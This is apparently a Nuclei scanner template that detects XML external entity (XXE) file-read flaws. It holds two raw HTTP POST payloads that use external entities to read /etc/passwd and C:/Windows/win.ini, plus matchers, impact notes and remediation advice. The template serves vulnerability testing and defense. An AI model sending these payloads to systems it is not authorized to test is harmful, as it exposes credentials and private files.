id: xxe-file-read

info:
  name: XXE - Local File Read
  author: n0x
  severity: high
  description: |
    Sends XML documents that use external entities to read common Linux and
    Windows files. A match on /etc/passwd or win.ini confirms local file
    disclosure through the XML parser.

    The endpoint must accept XML. Override xxe_url with -var when the parser is
    not at the site root. Use a benign target file and only against authorized
    systems.
  impact: |
    XXE file read can expose credentials, configuration files, private keys,
    and source code, often leading to full compromise.
  remediation: |
    Disable external entity and DTD processing, use secure parser defaults, and
    restrict filesystem permissions for the application account.
  reference:
    - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
    - https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
  classification:
    cwe-id: CWE-611
  metadata:
    max-request: 2
  tags: xxe,lfi,file-read,web

variables:
  xxe_url: "{{BaseURL}}"

http:
  - raw:
      - |
        POST {{xxe_url}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml
        Accept: application/xml

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <foo>&xxe;</foo>

    matchers:
      - type: word
        part: body
        words:
          - "root:x:0:0:"

  - raw:
      - |
        POST {{xxe_url}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml
        Accept: application/xml

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
        <foo>&xxe;</foo>

    matchers:
      - type: word
        part: body
        words:
          - "[fonts]"
          - "for 16-bit app support"
        condition: or
